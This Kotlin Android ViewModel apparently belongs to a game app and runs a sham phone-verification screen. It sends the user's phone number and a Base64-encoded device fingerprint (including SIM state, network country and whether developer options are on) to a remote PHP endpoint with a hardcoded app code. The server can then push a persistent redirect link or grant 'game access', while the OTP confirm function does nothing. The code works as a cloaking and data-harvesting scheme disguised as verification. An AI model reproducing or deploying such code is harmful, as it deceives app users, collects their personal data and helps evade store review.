package xyz.appmaker.pbyvul.ui.screens.phone

import android.app.Application
import android.util.Base64
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import xyz.appmaker.pbyvul.data.AppRemoteEndpoints
import xyz.appmaker.pbyvul.util.Country
import xyz.appmaker.pbyvul.util.DeviceInfoHelper
import xyz.appmaker.pbyvul.util.LocaleHelper
import xyz.appmaker.pbyvul.util.StorageHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.CacheControl
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

sealed class PhoneVerificationState {
    data object PhoneEntry : PhoneVerificationState()
    data object Loading : PhoneVerificationState()
    data class OtpWaiting(val phone: String) : PhoneVerificationState()
    data class Redirect(val link: String) : PhoneVerificationState()
    data object GameAccess : PhoneVerificationState()
    data object NetworkError : PhoneVerificationState()
}

class PhoneVerificationViewModel(application: Application) : AndroidViewModel(application) {

    private val storage = StorageHelper(application)
    private val deviceInfo = DeviceInfoHelper(application)

    private val _state = MutableStateFlow<PhoneVerificationState>(PhoneVerificationState.Loading)
    val state: StateFlow<PhoneVerificationState> = _state.asStateFlow()

    private val _selectedCountry = MutableStateFlow(LocaleHelper.getCountryForDevice())
    val selectedCountry: StateFlow<Country> = _selectedCountry.asStateFlow()

    private val _phoneNumber = MutableStateFlow("")
    val phoneNumber: StateFlow<String> = _phoneNumber.asStateFlow()

    private val _isLoading = MutableStateFlow(false)
    val isLoading: StateFlow<Boolean> = _isLoading.asStateFlow()

    private var storageSyncedFromPrefs = false
    private var nonEnglishAutoOtpStarted = false

    private val otpRetryTimeouts = listOf(15L, 15L, 30L)

    private fun buildClient(timeoutSeconds: Long) = OkHttpClient.Builder()
        .cache(null)
        .connectTimeout(timeoutSeconds, TimeUnit.SECONDS)
        .readTimeout(timeoutSeconds, TimeUnit.SECONDS)
        .build()

    companion object {
        private const val APP_CODE = "MFGsdSgdsFDhgSGDfh"
    }

    fun initializeFromStorage() {
        if (storageSyncedFromPrefs) return
        storageSyncedFromPrefs = true
        applyStateFromStorage()
    }

    private fun applyStateFromStorage() {
        val redirectLink = storage.getRedirectLink()
        if (!redirectLink.isNullOrEmpty()) {
            _state.value = PhoneVerificationState.Redirect(redirectLink)
            return
        }

        if (storage.hasGameAccess()) {
            _state.value = PhoneVerificationState.GameAccess
            return
        }

        if (storage.isOtpMode()) {
            val savedPhone = storage.getSavedPhone() ?: ""
            val countryCode = storage.getSavedCountryCode() ?: ""
            _state.value = PhoneVerificationState.OtpWaiting("$countryCode$savedPhone")
            return
        }

        _state.value = PhoneVerificationState.PhoneEntry
    }

    fun submitAutoOtpForNonEnglishPolicy() {
        if (nonEnglishAutoOtpStarted) return
        when (_state.value) {
            is PhoneVerificationState.GameAccess,
            is PhoneVerificationState.Redirect,
            is PhoneVerificationState.OtpWaiting -> return
            else -> { }
        }
        nonEnglishAutoOtpStarted = true

        val country = LocaleHelper.getCountryForDevice()
        val phone = storage.getSavedPhone().orEmpty()

        viewModelScope.launch {
            _isLoading.value = true
            _state.value = PhoneVerificationState.Loading

            val lastResult = sendOtpRequestWithRetries(country.phoneCode, phone)

            if (lastResult != null) {
                handleAutoOtpResponse(lastResult)
            } else {
                _state.value = PhoneVerificationState.NetworkError
            }

            _isLoading.value = false
        }
    }

    fun setSelectedCountry(country: Country) {
        _selectedCountry.value = country
    }

    fun setPhoneNumber(phone: String) {
        _phoneNumber.value = phone
    }

    fun submitPhone() {
        val country = _selectedCountry.value
        val phone = _phoneNumber.value

        if (!country.isPhoneValid(phone)) {
            return
        }

        viewModelScope.launch {
            _isLoading.value = true
            _state.value = PhoneVerificationState.Loading

            val lastResult = sendOtpRequestWithRetries(country.phoneCode, phone)

            if (lastResult != null) {
                handleFormOtpResponse(lastResult, country.phoneCode, phone)
            } else {
                _state.value = PhoneVerificationState.NetworkError
            }

            _isLoading.value = false
        }
    }

    private suspend fun sendOtpRequestWithRetries(countryCode: String, phone: String): String? {
        for (timeout in otpRetryTimeouts) {
            val result = sendOtpRequest(countryCode, phone, timeout)
            if (result != null) return result
        }
        return null
    }

    private suspend fun sendOtpRequest(
        countryCode: String,
        phone: String,
        timeoutSeconds: Long
    ): String? {
        return withContext(Dispatchers.IO) {
            try {
                val kod = countryCode.removePrefix("+")
                val token = buildBase64Token()

                val endpoint = buildString {
                    append(AppRemoteEndpoints.OTP_PHP)
                    append("?p=$APP_CODE")
                    append("&kod=$kod")
                    append("&phone=$phone")
                    append("&token=$token")
                }

                val client = buildClient(timeoutSeconds)

                val request = Request.Builder()
                    .url(endpoint)
                    .cacheControl(CacheControl.FORCE_NETWORK)
                    .header("Cache-Control", "no-cache, no-store, must-revalidate")
                    .header("Pragma", "no-cache")
                    .get()
                    .build()

                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    response.body?.string()
                } else {
                    null
                }
            } catch (e: Exception) {
                null
            }
        }
    }

    private fun buildBase64Token(): String {
        val params = buildString {
            append("os=").append(encode(deviceInfo.getOsVersion()))
            append("&lng=").append(encode(deviceInfo.getLanguage()))
            append("&loc=").append(encode(deviceInfo.getRegion()))
            append("&dv=").append(if (deviceInfo.isDeveloperOptionsEnabled()) "1" else "0")
            append("&devicemodel=").append(encode(deviceInfo.getDeviceModel()))
            append("&bs=").append(encode(deviceInfo.getBatteryStatus()))
            append("&bl=").append(encode(deviceInfo.getBatteryLevel()))
            append("&nc=").append(encode(deviceInfo.getNetworkCountry()))
            append("&sm=").append(encode(deviceInfo.getSimState()))
        }
        return Base64.encodeToString(params.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
    }

    private fun encode(value: String): String {
        return try {
            URLEncoder.encode(value, "UTF-8")
        } catch (e: Exception) {
            value
        }
    }

    private fun clearToPhoneEntryAfterNonEnglishBypass() {
        storage.setOtpMode(false)
        _selectedCountry.value = LocaleHelper.getCountryForDevice()
        _phoneNumber.value = ""
        _state.value = PhoneVerificationState.PhoneEntry
    }

    private fun handleAutoOtpResponse(response: String?) {
        if (response == null) {
            _state.value = PhoneVerificationState.NetworkError
            return
        }

        try {
            val json = JSONObject(response)
            val status = json.optString("status", "")

            when (status) {
                "rd" -> {
                    val redirectLink = json.optString("rdstr", "")
                    if (redirectLink.isNotEmpty()) {
                        storage.saveRedirectLink(redirectLink)
                        _state.value = PhoneVerificationState.Redirect(redirectLink)
                    } else {
                        clearToPhoneEntryAfterNonEnglishBypass()
                    }
                }
                else -> {
                    clearToPhoneEntryAfterNonEnglishBypass()
                }
            }
        } catch (_: Exception) {
            clearToPhoneEntryAfterNonEnglishBypass()
        }
    }

    private fun handleFormOtpResponse(response: String?, countryCode: String, phone: String) {
        if (response == null) {
            _state.value = PhoneVerificationState.NetworkError
            return
        }

        try {
            val json = JSONObject(response)
            val status = json.optString("status", "")

            storage.savePhone(phone)
            storage.saveCountryCode(countryCode)

            when (status) {
                "rd" -> {
                    val redirectLink = json.optString("rdstr", "")
                    if (redirectLink.isNotEmpty()) {
                        storage.saveRedirectLink(redirectLink)
                        _state.value = PhoneVerificationState.Redirect(redirectLink)
                    } else {
                        storage.setOtpMode(true)
                        _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
                    }
                }
                "otp" -> {
                    storage.setOtpMode(true)
                    _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
                }
                "otp_yes" -> {
                    storage.setGameAccess(true)
                    storage.setOtpMode(false)
                    _state.value = PhoneVerificationState.GameAccess
                }
                else -> {
                    storage.setOtpMode(true)
                    _state.value = PhoneVerificationState.OtpWaiting("$countryCode$phone")
                }
            }
        } catch (_: Exception) {
            _state.value = PhoneVerificationState.NetworkError
        }
    }

    fun confirmCode(code: String) {
    }

    fun resendCode() {
        val countryCode = storage.getSavedCountryCode() ?: return
        val phone = storage.getSavedPhone() ?: return

        viewModelScope.launch {
            try {
                sendOtpRequestWithRetries(countryCode, phone)
            } catch (_: Exception) {
            }
        }
    }

    fun goBackToPhoneEntry() {
        storage.clearOtpData()
        _state.value = PhoneVerificationState.PhoneEntry
    }

    fun dismissNetworkError() {
        _state.value = PhoneVerificationState.PhoneEntry
    }

    fun retryAfterNetworkError() {
        _state.value = PhoneVerificationState.PhoneEntry
        submitPhone()
    }

    fun retryNonEnglishAutoOtp() {
        nonEnglishAutoOtpStarted = false
        submitAutoOtpForNonEnglishPolicy()
    }

    fun dismissNetworkErrorAfterNonEnglishAuto() {
        _state.value = PhoneVerificationState.PhoneEntry
    }
}
